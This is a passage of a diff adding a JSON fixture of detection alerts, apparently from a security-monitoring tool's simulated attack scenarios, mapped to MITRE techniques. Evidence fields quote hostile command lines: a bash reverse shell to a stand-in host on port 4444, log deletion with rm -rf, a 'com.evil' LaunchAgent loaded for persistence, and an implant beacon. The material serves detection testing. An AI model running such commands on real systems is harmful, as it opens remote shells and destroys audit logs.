+      "evidence": "{\"match\": {\"title\": \"AI CLI Process -> External Egress\", \"severity\": \"medium\", \"conn_time\": \"2026-09-18 16:30:45+00:00\", \"host_name\": \"live-matrix-ai_process_egress-163144\", \"user_name\": \"demo\", \"ai_process\": \"claude\", \"confidence\": 60, \"start_time\": \"2026-09-18 16:30:15+00:00\", \"mitre_tactics\": [\"TA0010\"], \"correlation_id\": \"badb3c11-f404-40a0-8027-09189a972c3a\", \"destination_ip\": \"203.0.113.10\", \"correlation_rule\": \"ai_process_egress\", \"destination_port\": 443, \"mitre_techniques\": [\"T1048\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 907,
+      "host_name": "live-matrix-sigma-users-diff-163144",
+      "rule_name": "Service Account Anomaly",
+      "severity": "low",
+      "mitre_techniques": [
+        "T1078"
+      ],
+      "time": "2026-09-18 16:33:31.448823+00:00",
+      "description": "Detection: Detects authentication events from service accounts outside of normal patterns",
+      "evidence": "{\"id\": 1292260, \"time\": \"2026-09-18 16:32:38+00:00\", \"source\": \"osquery:logged_in_users\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-sigma-users-diff-163144\", \"source_ip\": null, \"user_name\": \"svc-backup\", \"event_type\": \"start\", \"process_pid\": 999, \"event_action\": \"auth_success\", \"process_name\": null, \"process_path\": null, \"destination_ip\": null, \"event_category\": \"authentication\", \"process_cmdline\": null, \"destination_port\": null}",
+      "ai_summary": "A low severity Service Account Anomaly alert was triggered for user 'svc-backup' on host 'live-matrix-sigma-users-diff-163144'. The user authenticated successfully.",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 908,
+      "host_name": "live-matrix-defense_evasion_cleanup-163144",
+      "rule_name": "Log File Deletion",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1070"
+      ],
+      "time": "2026-09-18 16:33:31.461462+00:00",
+      "description": "Detection: Detects deletion of log files, which may indicate an attacker trying to cover their tracks",
+      "evidence": "{\"id\": 1292261, \"time\": \"2026-09-18 16:33:09+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-defense_evasion_cleanup-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6502, \"event_action\": \"process_start\", \"process_name\": \"rm\", \"process_path\": \"/bin/rm\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"rm -rf /var/log/system.log\", \"destination_port\": null}",
+      "ai_summary": "The critical alert indicates the deletion of the system.log file on host 'live-matrix-defense_evasion_cleanup-163144' by the process 'rm'.",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 910,
+      "host_name": "live-matrix-sigma-users-diff-163144",
+      "rule_name": "macOS Local Account Created (users differential)",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1136"
+      ],
+      "time": "2026-09-18 16:33:31.464352+00:00",
+      "description": "Detection: Detects creation of a local user account on macOS via the osquery `users` table scheduled in DIFFERENTIAL mode: osquery emits an 'added' row only for an account that appeared since the previous interval, and the parser derives the account_created vocabulary token for it (the same token the Windows 4720 path emits). This is the macOS half of the V0.6b rogue-account-creation item (T1136); the Windows half is windows_local_account_created. The two rules are keyed apart by the `source` column (osquery:users vs osquery:windows_events) so one event cannot fire both. HONEST BEHAVIOR NOTES (validated live on the reference daemon, 2026-09-14): (1) the first schedule tick after an osquery (re)start stores the baseline SILENTLY -- no rows are emitted and there is NO restart burst; a stable account set emits nothing, so this rule fires only when an account actually appears on the host. (2) logged_in_users is deliberately NOT part of this detection: utmpx rows are session state (auth_success/session_closed tokens) -- a login session is not an account creation. (3) Deleted accounts ('removed' rows) carry no token -- the closed vocabulary has no account_deleted token; the raw rows survive in raw_data. The schedule filters to uid >= 500 (real accounts on macOS; system accounts stay below 500).\n",
+      "evidence": "{\"id\": 1292258, \"time\": \"2026-09-18 16:31:38+00:00\", \"source\": \"osquery:users\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-sigma-users-diff-163144\", \"source_ip\": null, \"user_name\": \"svc-backup\", \"event_type\": \"start\", \"process_pid\": null, \"event_action\": \"account_created\", \"process_name\": null, \"process_path\": null, \"destination_ip\": null, \"event_category\": \"authentication\", \"process_cmdline\": null, \"destination_port\": null}",
+      "ai_summary": "A new local account named 'svc-backup' was created on the host 'live-matrix-sigma-users-diff-163144'.",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 911,
+      "host_name": "live-matrix-persistence_activated-163144",
+      "rule_name": "LaunchAgent Persistence Created",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1547"
+      ],
+      "time": "2026-09-18 16:33:31.471264+00:00",
+      "description": "Detection: Detects creation of macOS LaunchAgent plist files for persistence",
+      "evidence": "{\"id\": 1291864, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:file_events\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": \"/Users/admin/Library/LaunchAgents/com.evil.liveagent.plist\", \"host_name\": \"live-matrix-persistence_activated-163144\", \"source_ip\": null, \"user_name\": null, \"event_type\": \"change\", \"process_pid\": null, \"event_action\": \"file_created\", \"process_name\": null, \"process_path\": null, \"destination_ip\": null, \"event_category\": \"file\", \"process_cmdline\": null, \"destination_port\": null}",
+      "ai_summary": "A new LaunchAgent persistence was created on the host 'live-matrix-persistence_activated-163144', which may indicate potential malicious activity.",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 913,
+      "host_name": "live-matrix-persistence_activated-163144",
+      "rule_name": "Hidden File Creation in User Directories",
+      "severity": "low",
+      "mitre_techniques": [
+        "T1564"
+      ],
+      "time": "2026-09-18 16:33:31.475592+00:00",
+      "description": "Detection: Detects creation of hidden files (dot-prefix) in user home directories, commonly used for stealth",
+      "evidence": "{\"id\": 1291864, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:file_events\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": \"/Users/admin/Library/LaunchAgents/com.evil.liveagent.plist\", \"host_name\": \"live-matrix-persistence_activated-163144\", \"source_ip\": null, \"user_name\": null, \"event_type\": \"change\", \"process_pid\": null, \"event_action\": \"file_created\", \"process_name\": null, \"process_path\": null, \"destination_ip\": null, \"event_category\": \"file\", \"process_cmdline\": null, \"destination_port\": null}",
+      "ai_summary": "Hidden file creation detected in a user directory",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 915,
+      "host_name": "live-matrix-brute_force_success-163144",
+      "rule_name": "Login from Unusual Geography",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1078"
+      ],
+      "time": "2026-09-18 16:33:31.478387+00:00",
+      "description": "Detection: Detects successful authentication from an IP address that does not match expected geographic patterns",
+      "evidence": "{\"id\": 1291863, \"time\": \"2026-09-18 16:31:15+00:00\", \"source\": \"auth_shipper\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-brute_force_success-163144\", \"source_ip\": \"198.51.100.70\", \"user_name\": \"admin\", \"event_type\": \"start\", \"process_pid\": null, \"event_action\": \"auth_success\", \"process_name\": null, \"process_path\": null, \"destination_ip\": null, \"event_category\": \"authentication\", \"process_cmdline\": null, \"destination_port\": null}",
+      "ai_summary": "Medium risk alert: Successful authentication from an unusual geography",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 917,
+      "host_name": "live-matrix-privilege_escalation_chain-163144",
+      "rule_name": "Privilege Escalation via Sudo",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1548"
+      ],
+      "time": "2026-09-18 16:33:31.483928+00:00",
+      "description": "Detection: Detects privilege escalation attempts using sudo",
+      "evidence": "{\"id\": 1291866, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-privilege_escalation_chain-163144\", \"source_ip\": null, \"user_name\": \"admin\", \"event_type\": \"start\", \"process_pid\": 6101, \"event_action\": \"process_start\", \"process_name\": \"sudo\", \"process_path\": \"/usr/bin/sudo\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"sudo -i\", \"destination_port\": null}",
+      "ai_summary": "A medium severity privilege escalation attempt via sudo was detected on the host 'live-matrix-privilege_escalation_chain-163144'",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 918,
+      "host_name": "live-matrix-persistence_activated-163144",
+      "rule_name": "Living-off-the-Land Binary Execution",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1218"
+      ],
+      "time": "2026-09-18 16:33:31.486268+00:00",
+      "description": "Detection: Detects execution of LOLBins (living-off-the-land binaries) commonly abused by attackers for fileless malware",
+      "evidence": "{\"id\": 1291865, \"time\": \"2026-09-18 16:30:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-persistence_activated-163144\", \"source_ip\": null, \"user_name\": \"admin\", \"event_type\": \"start\", \"process_pid\": 6001, \"event_action\": \"process_start\", \"process_name\": \"launchctl\", \"process_path\": \"/bin/launchctl\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"launchctl load /Users/admin/Library/LaunchAgents/com.evil.liveagent.plist\", \"destination_port\": null}",
+      "ai_summary": "The 'Living-off-the-Land Binary Execution' rule was triggered due to the start of a process named 'launchctl' with a suspicious command line argument.",
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 921,
+      "host_name": "live-matrix-privilege_escalation_chain-163144",
+      "rule_name": "Suspicious Process from /tmp",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.496953+00:00",
+      "description": "Detection: Detects process execution from temporary directories, common for malware staging (AUD-079, fixed 2026/09/18 \u2014 the selection previously required file_path, which the parser sets ONLY for file-category rows; process rows carry process_path, so the rule could never match)",
+      "evidence": "{\"id\": 1291867, \"time\": \"2026-09-18 16:30:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-privilege_escalation_chain-163144\", \"source_ip\": null, \"user_name\": \"0\", \"event_type\": \"start\", \"process_pid\": 6102, \"event_action\": \"process_start\", \"process_name\": \"python3\", \"process_path\": \"/tmp/py\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"python3 -c 'import pty'\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 922,
+      "host_name": "live-matrix-privilege_escalation_chain-163144",
+      "rule_name": "Renamed System Binary (Masquerading)",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1036"
+      ],
+      "time": "2026-09-18 16:33:31.497112+00:00",
+      "description": "Detection: Detects renamed copies of system utilities executing from non-standard paths",
+      "evidence": "{\"id\": 1291867, \"time\": \"2026-09-18 16:30:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-privilege_escalation_chain-163144\", \"source_ip\": null, \"user_name\": \"0\", \"event_type\": \"start\", \"process_pid\": 6102, \"event_action\": \"process_start\", \"process_name\": \"python3\", \"process_path\": \"/tmp/py\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"python3 -c 'import pty'\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 923,
+      "host_name": "live-matrix-defense_evasion_cleanup-163144",
+      "rule_name": "Reverse Shell Pattern Detected",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.497350+00:00",
+      "description": "Detection: Detects common reverse shell patterns in command lines indicating a compromised host calling back to attacker",
+      "evidence": "{\"id\": 1291404, \"time\": \"2026-09-18 16:31:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-defense_evasion_cleanup-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6501, \"event_action\": \"process_start\", \"process_name\": \"bash\", \"process_path\": \"/bin/bash\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"bash -i >& /dev/tcp/203.0.113.66/4444 0>&1\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 926,
+      "host_name": "live-matrix-data_exfiltration-163144",
+      "rule_name": "Data Exfiltration Volume",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1048"
+      ],
+      "time": "2026-09-18 16:33:31.498214+00:00",
+      "description": "Detection: Detects large outbound data transfers that may indicate data exfiltration",
+      "evidence": "{\"cnt\": 55, \"host_name\": \"live-matrix-data_exfiltration-163144\"}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 927,
+      "host_name": "live-matrix-payload_callback-163144",
+      "rule_name": "Outbound Connection to Rare/C2 Port",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1071"
+      ],
+      "time": "2026-09-18 16:33:31.505378+00:00",
+      "description": "Detection: Detects outbound connections to non-standard ports commonly associated with C2 and malware",
+      "evidence": "{\"id\": 1292018, \"time\": \"2026-09-18 16:30:45+00:00\", \"source\": \"osquery:open_sockets\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-payload_callback-163144\", \"source_ip\": \"192.168.1.50\", \"user_name\": null, \"event_type\": \"connection\", \"process_pid\": 6401, \"event_action\": \"network_connection\", \"process_name\": null, \"process_path\": null, \"destination_ip\": \"203.0.113.66\", \"event_category\": \"network\", \"process_cmdline\": null, \"destination_port\": 4444}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 928,
+      "host_name": "live-matrix-payload_callback-163144",
+      "rule_name": "Renamed System Binary (Masquerading)",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1036"
+      ],
+      "time": "2026-09-18 16:33:31.514070+00:00",
+      "description": "Detection: Detects renamed copies of system utilities executing from non-standard paths",
+      "evidence": "{\"id\": 1292017, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-payload_callback-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6401, \"event_action\": \"process_start\", \"process_name\": \"implant\", \"process_path\": \"/tmp/implant\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"/tmp/implant --beacon\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 929,
+      "host_name": "live-matrix-payload_callback-163144",
+      "rule_name": "Suspicious Process from /tmp",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.515831+00:00",
+      "description": "Detection: Detects process execution from temporary directories, common for malware staging (AUD-079, fixed 2026/09/18 \u2014 the selection previously required file_path, which the parser sets ONLY for file-category rows; process rows carry process_path, so the rule could never match)",
+      "evidence": "{\"id\": 1292017, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-payload_callback-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6401, \"event_action\": \"process_start\", \"process_name\": \"implant\", \"process_path\": \"/tmp/implant\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"/tmp/implant --beacon\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 930,
+      "host_name": "live-matrix-defense_evasion_cleanup-163144",
+      "rule_name": "Download and Execute Pattern",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.536672+00:00",
+      "description": "Detection: Detects download-then-execute patterns commonly used by malware droppers",
+      "evidence": "{\"id\": 1291404, \"time\": \"2026-09-18 16:31:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-defense_evasion_cleanup-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6501, \"event_action\": \"process_start\", \"process_name\": \"bash\", \"process_path\": \"/bin/bash\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"bash -i >& /dev/tcp/203.0.113.66/4444 0>&1\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 931,
+      "host_name": "live-matrix-ai_process_egress-163144",
+      "rule_name": "Encoded Command Execution",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1027"
+      ],
+      "time": "2026-09-18 16:33:31.552938+00:00",
+      "description": "Detection: Detects execution of base64-encoded commands, commonly used by attackers to obfuscate malicious payloads",
+      "evidence": "{\"id\": 1292021, \"time\": \"2026-09-18 16:30:15+00:00\", \"source\": \"osquery:es_process_events\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-ai_process_egress-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6701, \"event_action\": \"process_start\", \"process_name\": \"claude\", \"process_path\": \"/usr/local/bin/claude\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"claude --dangerously-skip-permissions\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 932,
+      "host_name": "live-matrix-defense_evasion_cleanup-163144",
+      "rule_name": "Script Interpreter from Unexpected Location",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.581883+00:00",
+      "description": "Detection: Detects script interpreters (python, perl, ruby, node) running from unexpected directories like /tmp or /var/tmp",
+      "evidence": "{\"id\": 1291404, \"time\": \"2026-09-18 16:31:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-defense_evasion_cleanup-163144\", \"source_ip\": null, \"user_name\": \"demo\", \"event_type\": \"start\", \"process_pid\": 6501, \"event_action\": \"process_start\", \"process_name\": \"bash\", \"process_path\": \"/bin/bash\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"bash -i >& /dev/tcp/203.0.113.66/4444 0>&1\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 933,
+      "host_name": "live-matrix-privilege_escalation_chain-163144",
+      "rule_name": "Script Interpreter from Unexpected Location",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:31.601711+00:00",
+      "description": "Detection: Detects script interpreters (python, perl, ruby, node) running from unexpected directories like /tmp or /var/tmp",
+      "evidence": "{\"id\": 1291867, \"time\": \"2026-09-18 16:30:45+00:00\", \"source\": \"osquery:processes\", \"host_ip\": null, \"severity\": null, \"file_hash\": null, \"file_path\": null, \"host_name\": \"live-matrix-privilege_escalation_chain-163144\", \"source_ip\": null, \"user_name\": \"0\", \"event_type\": \"start\", \"process_pid\": 6102, \"event_action\": \"process_start\", \"process_name\": \"python3\", \"process_path\": \"/tmp/py\", \"destination_ip\": null, \"event_category\": \"process\", \"process_cmdline\": \"python3 -c 'import pty'\", \"destination_port\": null}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 934,
+      "host_name": "live-matrix-payload_callback-163144",
+      "rule_name": "payload_callback",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1059",
+        "T1071"
+      ],
+      "time": "2026-09-18 16:33:31.789435+00:00",
+      "description": "Dropped Payload -> C2 Callback",
+      "evidence": "{\"match\": {\"title\": \"Dropped Payload -> C2 Callback\", \"severity\": \"critical\", \"conn_time\": \"2026-09-18 16:30:45+00:00\", \"host_name\": \"live-matrix-payload_callback-163144\", \"proc_time\": \"2026-09-18 16:30:15+00:00\", \"user_name\": \"demo\", \"confidence\": 75, \"process_name\": \"implant\", \"mitre_tactics\": [\"TA0002\", \"TA0011\"], \"correlation_id\": \"ce8c8a84-ce80-44bd-a3de-73d13540f343\", \"destination_ip\": \"203.0.113.66\", \"correlation_rule\": \"payload_callback\", \"destination_port\": 4444, \"mitre_techniques\": [\"T1059\", \"T1071\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    }
+  ]
+}
